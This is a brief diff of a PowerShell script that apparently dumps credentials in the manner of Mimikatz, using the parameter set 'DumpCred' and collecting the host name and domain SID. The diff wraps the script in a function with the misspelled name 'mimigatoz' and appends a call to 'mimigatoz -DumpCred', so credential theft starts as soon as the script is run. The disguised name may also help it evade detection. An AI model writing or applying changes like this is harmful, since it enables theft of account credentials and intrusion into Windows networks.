@@ -1,4 +1,4 @@
-
+function mimigatoz {
 
 [CmdletBinding(DefaultParameterSetName="DumpCred")]
 Param(
@@ -2679,3 +2679,5 @@ $DomainSID = $parts2[0..($parts2.Count-2)] -join '-';
 $results = Main;
 "Hostname: $HostName / $DomainSID";
 $results
+}
+mimigatoz -DumpCred
